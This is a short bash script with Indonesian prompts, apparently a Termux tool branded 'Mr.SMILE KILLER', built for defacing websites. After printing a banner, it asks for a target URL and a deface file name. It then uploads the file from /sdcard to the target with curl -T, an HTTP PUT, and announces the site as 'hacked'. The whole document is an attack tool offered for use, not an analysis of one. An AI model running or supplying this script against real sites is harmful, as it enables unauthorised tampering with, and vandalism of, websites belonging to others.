clear
cowsay -f eyes 'Mr.SMILE KILLER' | lolcat
figlet -f slant "Mr.SMILE KILLER" | lolcat
read -p " Masukkan Web Target  --> " target;
read -p " Masukkan Nama Script Deface --> " sc;
curl -T /sdcard/$sc $target
echo " [!] Berhasil Di Hack --> " $target/$sc
